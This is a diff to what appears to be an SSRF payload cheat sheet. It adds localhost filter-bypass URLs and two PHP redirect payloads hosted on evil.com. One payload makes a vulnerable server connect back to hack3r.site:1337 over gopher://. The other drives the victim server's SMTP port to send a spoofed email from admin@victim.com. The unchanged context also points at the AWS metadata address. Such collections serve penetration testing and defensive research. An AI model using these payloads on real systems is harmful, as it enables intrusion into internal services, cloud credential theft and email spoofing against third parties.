@@ -35,6 +35,12 @@ Using this vulnerability users can upload images from any image URL = trigger an
 ```
 
 ## Bypassing filters
+Bypass using HTTPS
+```
+https://127.0.0.1/
+https://localhost/
+```
+
 Bypass localhost with [::]
 ```
 http://[::]:80/
@@ -53,6 +59,7 @@ http://0000::1:3128/ Squid
 
 Bypass localhost with a domain redirecting to locahost
 ```
+http://localtest.me
 http://n-pn.info
 ```
 
@@ -144,6 +151,37 @@ You didn't say the magic word !
 QUIT
 ```
 
+Gopher:// SMTP - Back connect to 1337
+```php
+Content of evil.com/redirect.php:
+<?php
+header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
+?>
+
+Now query it.
+https://example.com/?q=http://evil.com/redirect.php.
+```
+Gopher:// SMTP - send a mail
+```php
+Content of evil.com/redirect.php:
+<?php
+        $commands = array(
+                'HELO victim.com',
+                'MAIL FROM: <admin@victim.com>',
+                'RCPT To: <sxcurity@oou.us>',
+                'DATA',
+                'Subject: @sxcurity!',
+                'Corben was here, woot woot!',
+                '.'
+        );
+
+        $payload = implode('%0A', $commands);
+
+        header('Location: gopher://0:25/_'.$payload);
+?>
+```
+
+
 ## SSRF on AWS Bucket
 Interesting path to look for at http://169.254.169.254
 ```
@@ -191,3 +229,4 @@ http://0251.00376.000251.0000376/ Dotted octal with padding
 * [Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat](https://www.dailysecurity.fr/server-side-request-forgery/)
 * [AppSecEU15 Server side browsing considered harmful - @Agarri](http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
 * [Enclosed alphanumerics - @EdOverflow](https://twitter.com/EdOverflow)
+* [Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity](http://www.sxcurity.pro/2017/12/17/hackertarget/)
